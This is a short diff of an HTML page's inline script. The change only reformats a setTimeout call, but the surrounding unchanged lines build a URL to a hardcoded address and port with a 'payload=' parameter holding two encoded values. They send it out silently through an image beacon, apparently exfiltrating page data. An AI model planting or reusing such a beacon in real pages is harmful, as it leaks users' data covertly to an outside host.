@@ -20,9 +20,12 @@
                     var ip = "172.27.19.10:12345";
                     var url = "http://"+ip+"/?"+"payload="+encodeURI(fires)+","+encodeURI(water);
                     new Image().src = url;
-                    setTimeout(function() {
-                        return true;
-                    }, 2000);
+                    setTimeout(
+                        function() {
+                            return true;
+                        },
+                        2000
+                    );
             };
         </script>
     </head>
